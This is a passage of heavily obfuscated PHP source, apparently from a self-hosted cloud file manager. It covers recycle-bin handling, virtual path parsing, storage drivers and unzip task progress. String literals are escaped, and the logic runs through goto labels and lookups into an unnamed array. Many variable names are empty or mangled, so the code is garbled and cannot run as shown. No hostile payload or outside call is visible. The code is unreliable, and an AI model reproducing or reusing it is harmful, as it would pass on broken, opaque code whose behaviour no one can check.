array(array("\143\162\145\x61\x74\145\x54\151\155\x65", "\164\151\155\145", "\151\x6e\x73\145\x72\x74", "\146\x75\156\143\x74\151\x6f\x6e")); public function listData($ɉ = false) { $¶ =& $_SERVER[]; $ɉ = $ɉ ? $ɉ : USER_ID; $ⓛ = $this->where(array($¶[1961] => $ɉ))->select(); return array_to_keyvalue($ⓛ, $¶[12], $¶[191]); } public function moveToRecycle($) { $ =& $_SERVER[]; $ݽϺ = Model($[1527]); $ = $ݽϺ->sourceInfo($); if (!$ || $[$[520]] == $[91]) { return; } $˸ = array($[506] => $, $[1961] => USER_ID, $[670] => $[$[188]], $[671] => $[$[589]], $[674] => $[$[604]]); $this->add($˸); $this->recycleMove($, 1); if ($[$[500]] == $[91]) { $ = array($[674] => array($[635], $[$[604]] . $ . $[636])); $ݽϺ->where($)->setField($[520], 1); } } public function clear() { $this->remove(!1); } public function remove($ؿ = false, $ = false) { $ =& $_SERVER[]; $ = $ ? $ : USER_ID; $ = Model($[1527]); $ÛÉ = $this->listData($); $ؿ = $ؿ === !1 ? !1 : $ؿ; $ҡ = array(); foreach ($ÛÉ as $ִ) { if ($ؿ != !1 && !in_array($ִ, $ؿ)) { continue; } $ = $->sourceInfo($ִ); $->remove($ִ, !1); $ = $[$[188]] . $[11] . $[$[589]]; $ҡ[$] = array($[670] => $[$[188]], $[589] => $[$[589]]); $this->where(array($[191] => $ִ))->delete(); } foreach ($ҡ as $) { $->targetSpaceUpdate($[$[188]], $[$[589]]); } } public function restore($㚠 = false) { $ɺ = $this->listData(); $this->_restoreSource($ɺ, $㚠); } public function removeUserAll($ؽ) { $this->remove(!1, $ؽ); } public function restoreItem($݀) { $this->_restoreSource(array($݀), array($݀)); } private function _restoreSource($䠩, $ҋ) { $ͫ =& $_SERVER[]; $屡 = Model($ͫ[1527]); $ҋ = $ҋ == !1 ? !1 : $ҋ; if (!$䠩) { return !0; } $ = array(); foreach ($䠩 as $ֻ) { if ($ҋ != !1 && !in_array($ֻ, $ҋ)) { continue; } $ = $屡->sourceInfo($ֻ); $ = $屡->sourceInfo($[$ͫ[190]]); if ($[$ͫ[520]] == $ͫ[91]) { continue; } $屡->lockMoveStart($ֻ); $this->recycleMove($ֻ, 0); if ($[$ͫ[500]] == $ͫ[91]) { $ = array($ͫ[674] => array($ͫ[635], $[$ͫ[604]] . $ֻ . $ͫ[636])); $屡->where($)->setField($ͫ[520], 0); $this->restoreFolderChildren($ֻ, $䠩); } $this->where(array($ͫ[191] => $ֻ))->delete(); $屡->folderSizeReset($[$ͫ[190]]); $[] = $[$ͫ[190]]; if ($[$ͫ[500]] == $ͫ[91]) { $[] = $ֻ; } $屡->lockMoveEnd($ֻ); } $屡->updateModifyTime($); } private function restoreFolderChildren($߫, $) { $δ =& $_SERVER[]; $ǥ = Model($δ[1527]); $ = array($δ[191] => array($δ[7], array())); foreach ($ as $) { if ($ == $߫) { continue; } if (!$ǥ->isParentOf($߫, $)) { continue; } $ᮍ = $ǥ->sourceInfo($); if ($ᮍ[$δ[500]] == $δ[91]) { $[] = array($δ[674] => array($δ[635], $ᮍ[$δ[604]] . $ . $δ[636])); } else { $[$δ[191]][1][] = $; } } if (!$[$δ[191]][1]) { unset($[$δ[191]]); } if (!$) { return; } if (is_array($[$δ[191]]) && is_array($[$δ[191]][1])) { $[$δ[191]][1] = array_unique($[$δ[191]][1]); } $[$δ[1162]] = $δ[2277]; $ǥ->where($)->setField($δ[520], 1); } private function recycleMove($ѷ, $ĥ܆ = 1) { $ =& $_SERVER[]; $➭ = Model($[1527]); $ѱہ = Model($[2507]); $è = array($[191] => $ѷ); if ($ĥ܆) { $➭->where($è)->setField($[520], 1); $ѱہ->eventRecycle($ѷ, $[2508]); } else { $ = $➭->where($è)->find(); $ðۊ = $[$[500]] == $[91]; $Վ = $➭->fileNameAuto($[$[190]], $[$[32]], REPEAT_RENAME_FOLDER, $ðۊ); if ($Վ != $[$[32]]) { $➭->rename($ѷ, $Վ); } $➭->where($è)->setField($[520], 0); $ѱہ->eventRecycle($ѷ, $[962]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\x73\157\165\x72\x63\145\123\145\x63\162\x65\x74\114\151\163\x74"; public $field = array("\163\157\165\x72\143\145\x49\104", "\x74\171\160\145\111\x44", "\143\x72\145\141\164\145\x55\x73\145\162"); } goto a⍍; a: class KodIO { const KOD_SOURCE = "\173\163\x6f\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\x72\x52\145\x63\x79\x63\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\x65\162\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\162\x46\x69\154\x65\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\x72\x46\x69\154\x65\124\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\x75\x70\x52\157\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\123\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\x53\150\x61\x72\145\x4c\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\x61\x72\145\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\145\x49\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\x65\111\164\145\155\x4c\x69\x6e\x6b\175"; const KOD_SHARE_OUTER = "\x7b\x73\150\x61\162\145\111\164\x65\155\x4f\165\x74\x7d"; const KOD_SEARCH = "\x7b\163\145\141\x72\x63\150\175"; const KOD_BLOCK = "\x7b\x62\154\x6f\143\x6b\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\163\x65\x72\122\145\156\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\x72\151\166\145\x72\x7d"; public static function typeList() { $ͅ =& $_SERVER[]; return array($ͅ[1433] => self::KOD_SOURCE, $ͅ[1434] => self::KOD_USER_RECYCLE, $ͅ[1435] => self::KOD_USER_FAV, $ͅ[1436] => self::KOD_USER_FILE_TAG, $ͅ[1437] => self::KOD_USER_FILE_TYPE, $ͅ[1438] => self::KOD_GROUP_ROOT_SELF, $ͅ[1439] => self::KOD_USER_SHARE, $ͅ[1440] => self::KOD_USER_SHARE_LINK, $ͅ[1441] => self::KOD_USER_SHARE_TO_ME, $ͅ[1442] => self::KOD_SHARE_ITEM, $ͅ[1443] => self::KOD_SHARE_LINK, $ͅ[1444] => self::KOD_SHARE_OUTER, $ͅ[1445] => self::KOD_SEARCH, $ͅ[1446] => self::KOD_BLOCK, $ͅ[1447] => self::KOD_IO, $ͅ[1448] => self::KOD_USER_RECENT, $ͅ[1449] => self::KOD_USER_DRIVER); } public static function parse($) { $ =& $_SERVER[]; $ = self::clear($); $Ԣ = array_values(self::typeList()); preg_match($[1450], $, $); $ˆ = array($[511] => !1, $[1451] => !1, $[508] => !1, $[87] => $, $[1351] => !1, $[1350] => $[12]); if (is_array($) && count($) == 5) { $ί = $[1452] . $[2] . $[402]; if (in_array($ί, $Ԣ)) { $ˆ[$[1351]] = $[1]; $ˆ[$[33]] = $ί; $ˆ[$[1453]] = substr($ί, 1, -1); $ˆ[$[487]] = $[3]; } $ˆ[$[1350]] = $[4]; } if ($ˆ[$[511]] == self::KOD_SOURCE) { $ˆ[$[487]] = intval($ˆ[$[487]]); $ˆ[$[1354]] = $ˆ[$[487]]; } $ = array($[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $ˆ[$[1417]] = in_array($ˆ[$[33]], $); return $ˆ; } public static function isTruePath($) { $ =& $_SERVER[]; if (substr($, 0, 1) != $[1452]) { return !0; } if (strpos($, $[498]) === 0) { return !0; } if (strpos($, $[1421]) === 0) { return !0; } if (strpos($, $[1454]) === 0) { return !0; } if (strpos($, $[1455]) === 0) { return !0; } if (strpos($, $[1456]) === 0) { return !0; } if (strpos($, $[1457]) === 0) { return !0; } return !1; } public static function clear($Ӡ) { $ܘ =& $_SERVER[]; $Ӡ = str_replace(array($ܘ[1244], $ܘ[285]), $ܘ[53], $Ӡ); $Ӡ = str_replace($ܘ[97], $ܘ[8], $Ӡ); $ޱݣ = $ܘ[1458]; if (substr($Ӡ, 0, 3) == $ܘ[1459]) { $Ӡ = substr($Ӡ, 3); } while (strstr($Ӡ, $ޱݣ)) { $Ӡ = str_replace($ޱݣ, $ܘ[8], $Ӡ); } $Ӡ = preg_replace($ܘ[1460], $ܘ[8], $Ӡ); if ($Ӡ == $ܘ[8]) { return $ܘ[8]; } $Ӡ = rtrim($Ӡ, $ܘ[8]); return $Ӡ; } public static function pathTrue($в) { $߂ =& $_SERVER[]; if (!$в) { return $߂[12]; } $в = str_replace($߂[254], $߂[8], str_replace($߂[1461], $߂[8], $в)); $в = str_replace($߂[254], $߂[8], str_replace($߂[1461], $߂[8], $в)); if (!strstr($в, $߂[1459])) { return $в; } $ڤ = explode($߂[8], $в); foreach ($ڤ as $ => $) { if ($ !== $߂[1462]) { continue; } for ($ϓȖ = $; $ϓȖ >= 0; $ϓȖ--) { if ($ڤ[$ϓȖ] === $߂[10] || $ڤ[$ϓȖ] === $߂[1462] || $ڤ[$ϓȖ] === -1) { continue; } if ($ڤ[$ϓȖ] === $߂[12]) { $ڤ[$] = -1; break; } $ڤ[$] = -1; $ڤ[$ϓȖ] = -1; break; } } $寴 = array(); foreach ($ڤ as $) { if ($ !== -1) { $寴[] = $; } } $ъ = implode($߂[8], $寴); if (strpos($ъ, $߂[1463]) === 0) { $ъ = $߂[1459] . substr($ъ, strlen($߂[1463])); } return $ъ; } public static function pathUrlClear($漴) { $Ĕ =& $_SERVER[]; if (!$漴) { return $漴; } $漴 = rawurldecode($漴); $漴 = str_replace($Ĕ[1461], $Ĕ[8], $漴); if (strpos($漴, $Ĕ[76]) > 0) { $漴 = substr($漴, 0, strpos($漴, $Ĕ[76])); } if (strpos($漴, $Ĕ[1464]) > 0) { $漴 = substr($漴, 0, strpos($漴, $Ĕ[1464])); } return $漴; } public static function sourceID($Κ) { $ےΠ =& $_SERVER[]; $ = self::parse($Κ); if ($[$ےΠ[33]] !== self::KOD_SOURCE) { show_json(LNG($ےΠ[1465]), !1); } return $[$ےΠ[487]]; } public static function make($ק) { if (!$ק) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ק)); } public static function makeShare($, $) { return self::makePath(self::KOD_SHARE_ITEM, $, $); } public static function makeFileTypePath($񢢤) { return self::makePath(self::KOD_USER_FILE_TYPE, $񢢤); } public static function makeFileTagPath($) { return self::makePath(self::KOD_USER_FILE_TAG, $); } public static function makePath($, $ש = '', $ө = '') { $Ф =& $_SERVER[]; $êȎ = substr($, 1, -1); $ĺ = $Ф[1466] . $êȎ . $Ф[1467] . $ש . $Ф[1468]; $ĺ = $ө ? $ĺ . $ө . $Ф[8] : $ĺ; return $ĺ; } public static function hashPath($ڃ, $ȫ = false) { $䧇 =& $_SERVER[]; if (!$ڃ) { return $䧇[12]; } $﹙ = is_array($ڃ) ? $ڃ : IO::info($ڃ); $ϖ = _get($﹙, $䧇[1469], $䧇[12]); if (!$ϖ && isset($﹙[$䧇[557]])) { $ϖ = $﹙[$䧇[557]]; } if (!$ϖ && isset($﹙[$䧇[235]])) { $ϖ = trim($﹙[$䧇[235]], $䧇[118]); } if ($ϖ) { return $ϖ; } if (!$ϖ && isset($﹙[$䧇[191]]) && $﹙[$䧇[191]]) { $﹙ = IO::info(KodIO::make($﹙[$䧇[191]])); $ϖ = _get($﹙, $䧇[1469], $䧇[12]); if (!$ϖ && isset($﹙[$䧇[557]])) { $ϖ = $﹙[$䧇[557]]; } } $ = md5($﹙[$䧇[87]] . $﹙[$䧇[79]] . $﹙[$䧇[88]]); $² = $ . $䧇[1470]; $ϖ = $ϖ ? $ϖ : Cache::get($²); if (!$ϖ && $ȫ) { $ϖ = IO::hashSimple($﹙[$䧇[87]]); Cache::set($², $ϖ ? $ϖ : $, 3600 * 24 * 30); } return $ϖ ? $ϖ : $; } public static function hashPathSafe($, $﹔ = false) { $鹔 =& $_SERVER[]; $ = self::hashPath($, $﹔); return md5($ . $鹔[1471] . Model($鹔[867])->get($鹔[868])); } public static function initSystemPath() { $ =& $_SERVER[]; if (defined($[1472])) { return; } define($[1472], self::systemPath($[189])); define($[1473], self::systemPath($[1474])); define($[1475], self::systemPath($[1476])); define($[1477], self::systemPath($[1478])); IOHistory::bindEvent(); } public static function systemPath($۶) { $밸 =& $_SERVER[]; $ؤ = $밸[1479] . ucfirst($۶); $ = Model($밸[867])->get($ؤ); if ($) { return $; } if ($۶ == $밸[189]) { $ = self::make(Model($밸[927])->systemRootPathAdd($밸[628])); } else { $ = self::systemPath($밸[189]); $Ϫ = self::sourceID($); $ = self::make(Model($밸[927])->mkdir($Ϫ, $۶)); } Model($밸[867])->set($ؤ, $); return $; } public static function systemFolder($̤) { $ = IO_PATH_SYSTEM_SOURCE . $̤; $Č = Cache::get($); if (!$Č) { $ = IO::infoFullSimple($); if (!$) { $Č = IO::mkdir($, REPEAT_SKIP); } else { $Č = $[$_SERVER[][87]]; } Cache::set($, $Č, 3600 * 10); } return $Č; } public static function defaultDriver() { return Model($_SERVER[][862])->defaultDriver(); } public static function defaultDriverInit() { $ =& $_SERVER[]; static $ = false; if ($) { return $; } $ = self::defaultDriver(); $ = IO::init($[1480] . $[$[487]] . $[1468]); return $; } public static function fileTypeList() { $ǈ =& $_SERVER[]; $ޗ = $GLOBALS[$ǈ[6]][$ǈ[1481]]; foreach ($ޗ as $ => $峨) { $ = $ǈ[1482] . $; $ = LNG($); if ($ != $) { $ޗ[$][$ǈ[32]] = $; } } return $ޗ; } public static function ioFileDriverGet($ = '') { $ =& $_SERVER[]; static $ = array(); static $ = array(); static $ɾ = array(); static $ɓ = false; if ($ɓ === !1) { $ɓ = array($[598] => array(), $[684] => array()); $呚 = Model($[1483])->get(!1, $[1484]); foreach ($呚 as $٧Э => $Ќ) { if (!$Ќ || $Ќ == $[12]) { continue; } if (strstr($٧Э, $[1485])) { $ƗӁ = str_replace($[1485], $[12], $٧Э); $ɓ[$[598]][$ƗӁ] = $Ќ; } else { if (strstr($٧Э, $[1486])) { $ƗӁ = str_replace($[1486], $[12], $٧Э); $ɓ[$[684]][$ƗӁ] = $Ќ; } } } } $ = self::defaultDriver(); if (!$ || !$ɓ[$[598]] && !$ɓ[$[684]]) { return $; } $ = self::getPathSourceID($); if (!$) { return $; } if (isset($[$])) { return $[$]; } $ = Model($[927])->sourceInfo($); $Ȩ = $[$[589]]; $К = array(); if (!$) { return $; } if ($[$[188]] == $[91]) { if (isset($ɾ[$Ȩ])) { return $ɾ[$Ȩ]; } if (isset($ɓ[$[684]][$Ȩ])) { $ۺ = Model($[862])->driverInfo($ɓ[$[684]][$Ȩ]); $ = $ۺ ? $ۺ : $; $ɾ[$Ȩ] = $; $[$] = $; return $; } $К = self::groupParentUser($Ȩ); } else { if ($[$[188]] == $[524]) { $ = Model($[1487])->getInfo($Ȩ); if ($) { $К = explode($[50], trim($[$[604]], $[50])); $К = array_remove_value($К, $[228]); $К[] = $Ȩ; $К = array_reverse($К); } } } foreach ($К as $) { if (!isset($ɓ[$[598]][$])) { continue; } if (isset($[$])) { return $[$]; } $ۺ = Model($[862])->driverInfo($ɓ[$[598]][$]); $ = $ۺ ? $ۺ : $; $[$] = $; break; } if ($[$[188]] == $[91]) { $ɾ[$Ȩ] = $; } $[$] = $; return $; } private static function getPathSourceID($Е) { $ˋ =& $_SERVER[]; static $ = array(); if (!$Е) { return $ˋ[12]; } $򩅥 = substr($Е, 0, strlen($ˋ[498])) == $ˋ[498]; $ɺ = substr($Е, 0, strlen($ˋ[1454])) == $ˋ[1454]; $뚲席 = substr($Е, 0, strlen($ˋ[1455])) == $ˋ[1455]; if (!$򩅥 && !$ɺ && !$뚲席) { return $ˋ[12]; } $́ = self::parse($Е); $آ = $́[$ˋ[1351]]; if ($򩅥) { return $́[$ˋ[487]]; } if (isset($[$آ])) { $ = $[$آ]; } else { $ = IO::init($آ); $[$آ] = $; } if (isset($->pathParse[$ˋ[1354]])) { return $->pathParse[$ˋ[1354]]; } return $ˋ[12]; } private static function groupParentUser($) { $ =& $_SERVER[]; $ʹ = Model($[617])->getInfo($); if (!$ʹ) { return array(); } $ưפ = array_to_keyvalue($ʹ[$[1488]], $[12], $[1489]); $ = array(); foreach ($ʹ[$[1488]] as $) { $[] = $[$[1489]]; $ѿ = explode($[50], trim($[$[604]], $[50])); $ѿ = array_remove_value($ѿ, $[228]); $ѿ = array_reverse($ѿ); $ = array_merge($, $ѿ); } return array_unique($); } public static function diskList($ = true) { $̦ = $_SERVER[][1490]; if ($) { $Ϝ = Cache::get($̦); if (is_array($Ϝ)) { return $Ϝ; } } $Ϝ = self::diskListGet(); Cache::set($̦, $Ϝ, 60); return $Ϝ; } public static function diskListGet() { $ǋ۝ =& $_SERVER[]; $ͤ = array(); if ($GLOBALS[$ǋ۝[6]][$ǋ۝[1491]] == $ǋ۝[1492]) { $ᴻ = $ǋ۝[1493]; for ($ = 0; $ < strlen($ᴻ); $++) { $ć = $ᴻ[$] . $ǋ۝[1494]; if (file_exists($ć)) { $ͤ[] = $ć; } } return $ͤ; } if (!function_exists($ǋ۝[98])) { $ͤ[] = $ǋ۝[986]; return $ͤ; } $ʴԃ = explode($ǋ۝[285], shell_exec($ǋ۝[1495])); array_shift($ʴԃ); array_pop($ʴԃ); $״ = array($ǋ۝[1496], $ǋ۝[1497], $ǋ۝[1498], $ǋ۝[1499], $ǋ۝[1500], $ǋ۝[1501], $ǋ۝[1502], $ǋ۝[1503]); foreach ($ʴԃ as $ª) { $Ԃ = preg_split($ǋ۝[1504], $ª); $ć = $Ԃ[count($Ԃ) - 1]; if (!strstr($Ԃ[0], $ǋ۝[1505]) || !$ć) { continue; } $壩 = rtrim($ć, $ǋ۝[8]) . $ǋ۝[8]; $ͤ[] = $壩; } return $ͤ; } public static function isSameDisk($, $ܹ) { $䵦 =& $_SERVER[]; if ($GLOBALS[$䵦[6]][$䵦[1491]] == $䵦[1492]) { return strtolower(substr($, 0, 1)) == strtolower(substr($ܹ, 0, 1)); } $۩ = stat($); $ = stat($ܹ); if ($۩ === !1 || $ === !1) { return !1; } return $۩[$䵦[1506]] === $[$䵦[1506]]; $ = self::diskList(); $Ǝ = !1; $ = !1; sort($); $ = array_reverse($); $ = rtrim($, $䵦[8]) . $䵦[8]; $ܹ = rtrim($ܹ, $䵦[8]) . $䵦[8]; foreach ($ as $) { $ = strlen($); if (!$Ǝ && substr($, 0, $) == $) { $Ǝ = $; } if (!$ && substr($ܹ, 0, $) == $) { $ = $; } if ($Ǝ && $) { break; } } return $Ǝ === $; } public static function transferType($ݢ, $٠) { $َ =& $_SERVER[]; $ּǂ = self::driverType($ݢ); $إ = self::driverType($٠); if ($ּǂ[$َ[33]] == $إ[$َ[33]] && $ּǂ[$َ[1507]] == $إ[$َ[1507]]) { return $َ[1508]; } if ($ּǂ[$َ[33]] == $َ[1028] && $إ[$َ[33]] == $َ[106]) { return $َ[1379]; } if ($ּǂ[$َ[33]] == $َ[106] && $إ[$َ[33]] == $َ[1028]) { return $َ[107]; } return $َ[1509]; } public static function driverType($㖘) { $ݚ =& $_SERVER[]; $ = str_replace($ݚ[1510], $ݚ[12], strtolower($㖘->getType())); if ($ == $ݚ[852] || $ == $ݚ[1511] || $ == $ݚ[1512]) { $ = self::ioFileDriverGet($ݚ[498] . $㖘->pathParse[$ݚ[1354]] . $ݚ[402]); $㖘 = IO::init($ݚ[1480] . $[$ݚ[487]] . $ݚ[1468]); } else { if ($ == $ݚ[1388] || $ == $ݚ[1513]) { $㖘 = IO::init($㖘->pathParse[$ݚ[1331]]); } } $ȭ = $㖘->path; $ = str_replace($ݚ[1510], $ݚ[12], strtolower($㖘->getType())); if ($ == $ݚ[106]) { return array($ݚ[33] => $ݚ[106], $ݚ[1507] => $ݚ[12], $ݚ[87] => $ȭ, $ݚ[96] => $㖘); } return array($ݚ[33] => $ݚ[1028], $ݚ[1507] => $㖘->pathDriver, $ݚ[87] => $ȭ, $ݚ[96] => $㖘); } public static function pathDriverType($Ҏ) { return $Ҏ ? self::driverType(IO::init($Ҏ)) : !1; } public static function pathDriverLocal($) { $ =& $_SERVER[]; $蟟 = $ ? self::driverType(IO::init($)) : !1; return strtolower($蟟[$[33]]) == $[106] ? !0 : !1; } public static function allowCover($ܒ, $ܚۻ = true) { $ =& $_SERVER[]; if (is_string($ܒ)) { $ܒ = IO::info($ܒ); } if (!$ܒ || $ܒ[$[33]] == $[78] || $ܒ[$[79]] <= 100) { return !1; } if (isset($ܒ[$[1514]]) || !$ܒ[$[87]]) { return !1; } if (isset($ܒ[$[232]]) && !$ܒ[$[232]]) { return !1; } static $ = false; if (!$ || !$ܚۻ) { $ = self::driverType(IO::init($ܒ[$[87]])); $ = $[$[96]]; $ = $[194]; if ($[$[33]] == $[106]) { $ = $[1515]; } if ($[$[96]] && is_array($[$[96]]->config)) { $ؚ = $[$[96]]->config; if (isset($ؚ[$[1516]]) && $ؚ[$[1516]]) { $ = $[1515]; } } $ޙ = KodIO::defaultDriver(); if (strtolower($ޙ[$[96]]) == $[106] && is_array($ޙ[$[6]])) { $Ӱ = $ޙ[$[6]][$[1363]]; if (substr($Ӱ, 0, 2) == $[1517]) { $Ӱ = str_replace($[1517], BASIC_PATH, $Ӱ); } $Ӱ = str_replace($[254], $[8], $Ӱ); if (substr($ܒ[$[87]], 0, strlen($Ӱ)) == $Ӱ) { $ = $[194]; } } } return $ == $[1515] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($) { parent::__construct($); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($γ) { parent::__construct($γ); $this->setSignVersion($_SERVER[][247]); } public function uploadFormData($, $͙ݪ = 3600) { $䱁 =& $_SERVER[]; $ = $䱁[229]; $ѧ = $䱁[1518]; $ϳ䝟 = $䱁[261]; $ = gmdate($䱁[1519], time() + $͙ݪ); $ = (string) time() . $䱁[74] . (string) (time() + $͙ݪ); $ᤃ = array($䱁[262] => $, $䱁[265] => array(array($䱁[306] => $), array($䱁[266] => $this->bucket), array($䱁[267], $䱁[268], $䱁[12]), array($䱁[270] => $ϳ䝟), array($䱁[1520] => $ѧ), array($䱁[1521] => $this->accessKey), array($䱁[1522] => $))); $ᤃ = json_encode($ᤃ); $ = hash_hmac($䱁[1518], $, $this->secret); $ = sha1($ᤃ); $ׁ = hash_hmac($䱁[1518], $, $); $٩ = array($䱁[306] => $, $䱁[270] => $ϳ䝟, $䱁[277] => base64_encode($ᤃ), $䱁[1520] => $ѧ, $䱁[1521] => $this->accessKey, $䱁[1523] => $, $䱁[1524] => $ׁ, $䱁[206] => $this->getHost()); return $٩; } public function fileOutImage($ھ, $Ҩ = 250) { $Ɠꮲ =& $_SERVER[]; if ($this->size($ھ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ھ, $Ҩ); } $ = $this->link($ھ); $ .= $Ɠꮲ[1525] . $Ҩ . $Ɠꮲ[1526]; $this->fileOutLink($); } } goto eȧ; E霦: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($, $У = 5.0) { if (!$) { return; } $ = Cache::get($); if (!$ || timeFloat() - floatVal($) >= $У) { Cache::set($, timeFloat(), $У * 10); return !0; } return !1; } public static function timeLimitCall($˽兾, $, $, $ = 5.0) { $ =& $_SERVER[]; if (!$˽兾 || !$) { return; } self::$asyncAdd = !0; $ۢ = $[2085]; $ = Cache::get($ۢ, !0); $ӯ = array($[2086] => timeFloat(), $[2087] => timeFloat(), $[342] => $, $[2077] => $, $[2088] => $); if (is_array($[$˽兾])) { if (timeFloat() - $[$˽兾][$[2086]] <= $ӯ[$[2088]] * 0.5) { return; } $ӯ[$[2087]] = $[$˽兾][$[2087]]; } $[$˽兾] = $ӯ; Cache::set($ۢ, $, 60); Cache::removeMemory($ۢ); write_log($[2089] . $˽兾 . $[74] . $ . $[2090] . ACTION, $[195]); } public static function timeLimitCallLoop() { $ͤ씵 =& $_SERVER[]; $ە = array($ͤ씵[2091]); $ڥ = in_array(strtolower(ACTION), $ە); if (!$ڥ && !self::$asyncAdd) { return; } $ = $ͤ씵[2085]; $ = Cache::get($, !0); if (!$ || count($) <= 0) { return; } $ = timeFloat(); $պ = array(); $䨋 = array(); foreach ($ as $ => $) { if ($ - $[$ͤ씵[2087]] > $[$ͤ씵[2088]]) { $䨋[$] = $; continue; } $պ[$] = $; } if (count($䨋) == 0) { return; } if (count($պ) == 0) { Cache::remove($); } else { Cache::set($, $պ, 60); } Cache::removeMemory($); self::runArr($䨋); } public static function finished($涇, $Ҟ) { $θ =& $_SERVER[]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($θ[342] => $涇, $θ[2077] => $Ҟ); } private static function runArr($) { $ύ =& $_SERVER[]; if (!$) { return; } foreach ($ as $ => $Ќ) { try { Hook::apply($Ќ[$ύ[342]], $Ќ[$ύ[2077]]); write_log($ύ[2092] . $ . $ύ[74] . $Ќ[$ύ[342]] . $ύ[2090] . ACTION, $ύ[195]); } catch (Exception $ö) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ӯֵ =& $_SERVER[]; parent::startAfter(); Hook::bind($ӯֵ[2093], array($this, $ӯֵ[2094])); Hook::bind($ӯֵ[1378], array($this, $ӯֵ[2095])); Hook::bind($ӯֵ[2096], array($this, $ӯֵ[2097])); $ѳق =& $this->task; $ѳق[$ӯֵ[2098]] = $ӯֵ[1379]; if (!$ѳق[$ӯֵ[1859]]) { $ѳق[$ӯֵ[1859]] = LNG($ӯֵ[2099]); } } protected function endAfter() { $ =& $_SERVER[]; parent::endAfter(); Hook::unbind($[2093], array($this, $[2094])); Hook::unbind($[1378], array($this, $[2095])); Hook::unbind($[2096], array($this, $[2097])); } public function updateAfter() { $ր =& $_SERVER[]; $Ҵ =& $this->task; if (!$Ҵ[$ր[1226]] || !$Ҵ[$ր[858]]) { if ($Ҵ[$ր[2098]] != $ր[388]) { return; } } if ($Ҵ[$ր[2098]] == $ր[1379]) { $ť = 0; if ($Ҵ[$ր[2023]]) { $ť = $Ҵ[$ր[2024]] / $Ҵ[$ր[2023]]; } $Ҵ[$ր[1971]] = $ť * 0.3; } else { if ($Ҵ[$ր[2098]] == $ր[388]) { $ť = $Ҵ[$ր[1970]] / $Ҵ[$ր[1226]]; $Ҵ[$ր[1971]] = 0.3 + $ť * 0.4; } else { if ($Ҵ[$ր[2098]] == $ր[107]) { $ƹ = 0; if ($Ҵ[$ր[2025]] == $ր[107]) { $ƹ = $Ҵ[$ր[2024]]; } $ť = ($Ҵ[$ր[935]] + $ƹ) / $Ҵ[$ր[858]]; $Ҵ[$ր[1971]] = 0.3 + 0.4 + $ť * 0.3; } } } if ($Ҵ[$ր[1971]] > 0) { $̀ = timeFloat() - $Ҵ[$ր[1973]] - $Ҵ[$ր[1976]]; $Ҵ[$ր[1977]] = $̀ * (1 - $Ҵ[$ր[1971]]) / $Ҵ[$ր[1971]]; } } public function addFile($) { $֯ =& $_SERVER[]; $ȡ٥ =& $this->task; $㳪ߏ = IO::info($); $ȡ٥[$֯[2021]] = $㳪ߏ[$֯[32]]; $ȡ٥[$֯[2023]] = $㳪ߏ[$֯[79]]; $ȡ٥[$֯[2024]] = 0; $ȡ٥[$֯[1228]] = $֯[2051]; $ȡ٥[$֯[2025]] = $֯[1379]; $ȡ٥[$֯[858]] = $㳪ߏ[$֯[79]]; $ȡ٥[$֯[1226]] = 1; $Ô = 0; $ȡ٥[$֯[2033]] = array($֯[2034] => $Ô + 1, $֯[509] => $㳪ߏ[$֯[32]], $֯[87] => $㳪ߏ[$֯[87]], $֯[602] => $㳪ߏ[$֯[602]] ? $㳪ߏ[$֯[602]] : $㳪ߏ[$֯[87]]); $this->update(); } public function zipEvent($, $𜳴, $, $Ό) { $ =& $_SERVER[]; $ն㷾 =& $this->task; $ն㷾[$[2021]] = get_path_this($𜳴); $ն㷾[$[2023]] = $Ό; $ն㷾[$[2024]] = $; $ն㷾[$[1228]] = $ == $[2100] ? $[2101] : $[2102]; $ն㷾[$[2025]] = $[12]; $ն㷾[$[858]] = $Ό; $ն㷾[$[2098]] = $[388]; $this->update(); } public function unzipAfter($) { $ʙ =& $_SERVER[]; $ =& $this->task; $[$ʙ[2098]] = $ʙ[107]; $ƫ = IO::infoWithChildren($); $ɺ = 0; $[$ʙ[2033]] = array($ʙ[2034] => $ɺ + 1, $ʙ[509] => $ƫ[$ʙ[32]], $ʙ[87] => $ƫ[$ʙ[87]], $ʙ[602] => $ƫ[$ʙ[602]] ? $ƫ[$ʙ[602]] : $ƫ[$ʙ[87]]); if ($ƫ[$ʙ[33]] == $ʙ[230]) { $[$ʙ[1226]] = 1; } else { $[$ʙ[1226]] = $ƫ[$ʙ[82]][$ʙ[80]]; } $[$ʙ[1228]] = $ʙ[12]; $[$ʙ[2025]] = 0; $[$ʙ[1970]] = 0; $[$ʙ[2023]] = 0; $[$ʙ[2024]] = 0; $[$ʙ[2021]] = $ʙ[12]; $[$ʙ[935]] = 0; $[$ʙ[858]] = $ƫ[$ʙ[79]]; $this->update(); self::log($ʙ[2103] . json_encode(array($, $ƫ))); } public function nameParse($) { $գ =& 